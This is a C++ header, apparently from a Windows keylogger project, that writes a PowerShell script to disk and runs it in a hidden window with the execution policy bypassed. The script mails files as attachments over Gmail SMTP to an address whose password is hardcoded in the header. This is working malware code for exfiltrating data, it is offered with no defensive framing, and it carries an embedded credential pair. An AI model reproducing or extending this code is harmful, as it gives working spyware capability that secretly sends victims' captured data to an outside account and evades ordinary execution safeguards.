#pragma once

#ifndef SEND_MAIL_H
#define SEND_MAIL_H

#include <fstream>
#include <vector>
#include <algorithm>
#include <windows.h>

#include "IO.h"
#include "Timer.h"
#include "Utils.h"

#define SCRIPT_NAME "sm.ps1"

/**
 * TODO look over this class and potentially reorganize
 */

namespace Mail
{

#define X_EM_TO "iakoolkidhello@gmail.com"
#define X_EM_FROM "iakoolkidhello@gmail.com"
#define X_EM_PASS "Mommy&Daddy"

	const std::string& PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(X_EM_PASS) +
		"\""
		" -From \"" +
		std::string(X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

#undef X_EM_TO
#undef X_EM_FROM
#undef X_EM_PASS

	std::string StringReplace(std::string s, const std::string& what, const std::string& with)
	{
		if (what.empty()) return "";

		size_t sp = 0;

		// Update in the future
		while ((sp = s.find(what, sp)) != std::string::npos)
		{
			s.replace(sp, what.length(), with), sp += with.length();
		}

		return s;
	}

	bool CheckFileExists(const std::string& path)
	{
		std::ifstream file(path);
		bool exists = (bool)file;
		file.close();

		return exists;
	}

	bool CreateScript()
	{
		std::ofstream script(IO::GetOutputPath(true) + std::string(SCRIPT_NAME));

		if (!script) return false;
		script << PowerShellScript;

		if (!script) return false;

		script.close();
		return true;
	}

	Timer m_timer;

	int SendMail(const std::string& subject, const std::string& body, const std::string& attatchments)
	{
		bool ok;

		ok = IO::MKDir(IO::GetOutputPath(true));
		if (!ok) return -1;

		std::string scr_path = IO::GetOutputPath(true) + std::string(SCRIPT_NAME);
		if (!CheckFileExists(scr_path))
			ok = CreateScript();
		if (!ok) return -2;

		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" +
			StringReplace(subject, "\"", "\\\"") + "\" -Body \"" +
			StringReplace(body, "\"", "\\\"") +
			"\" -Att \"" + attatchments + "\"";

		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";
		ShExecInfo.lpFile = "powershell";
		ShExecInfo.lpParameters = param.c_str();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE;
		ShExecInfo.hInstApp = NULL;

		ok = (bool)ShellExecuteEx(&ShExecInfo);
		if (!ok) return -3;

		WaitForSingleObject(ShExecInfo.hProcess, 7000);
		DWORD exit_code = 100;
		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

		m_timer.SetFunction([&]()
			{
				WaitForSingleObject(ShExecInfo.hProcess, 60000);
				GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
				if ((int)exit_code == STILL_ACTIVE) TerminateProcess(ShExecInfo.hProcess, 100);
				IO::WriteAppLog("<From SendMail> Return Code: " + Utils::ToString((int)exit_code));
			});

		m_timer.RepeatCount(1L);
		m_timer.SetInterval(10L);
		m_timer.Start(true);
		return (int)exit_code;
	}

	int SendMail(const std::string& subject, const std::string& body, const std::vector<std::string>& att)
	{
		std::string attatchments = "";
		if (att.size() == 1U)
			attatchments = att[0];
		else
		{
			for (const auto& v : att)
				attatchments += v + "::";
			attatchments = attatchments.substr(0, attatchments.length() - 2);
		}
		return SendMail(subject, body, attatchments);
	}
}

#endif
